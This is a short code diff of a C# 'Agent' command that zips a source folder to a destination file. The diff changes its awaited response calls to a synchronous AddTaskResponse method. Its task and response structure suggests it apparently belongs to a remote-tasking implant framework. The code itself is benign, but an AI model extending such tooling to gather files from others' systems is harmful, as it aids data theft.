@@ -31,7 +31,7 @@ namespace Agent
 
             if(args == null || !args.Validate())
             {
-                await messageManager.AddResponse(new TaskResponse()
+                messageManager.AddTaskResponse(new TaskResponse()
                 {
                     task_id = job.task.id,
                     user_output = "Failed to validate arguments",
@@ -43,7 +43,7 @@ namespace Agent
 
             if (!Directory.Exists(args.source))
             {
-                await messageManager.AddResponse(new TaskResponse()
+                messageManager.AddTaskResponse(new TaskResponse()
                 {
                     task_id = job.task.id,
                     user_output = "Source folder doesn't exist",
@@ -55,7 +55,7 @@ namespace Agent
 
             if (File.Exists(args.destination))
             {
-                await messageManager.AddResponse(new TaskResponse()
+                messageManager.AddTaskResponse(new TaskResponse()
                 {
                     task_id = job.task.id,
                     user_output = "Destination already exists",
@@ -65,7 +65,7 @@ namespace Agent
                 return;
             }
             ZipFile.CreateFromDirectory(args.source, args.destination, CompressionLevel.SmallestSize, false);
-            await messageManager.AddResponse(new TaskResponse()
+            messageManager.AddTaskResponse(new TaskResponse()
             {
                 task_id = job.task.id,
                 user_output = $"Zip written to {args.destination}.",
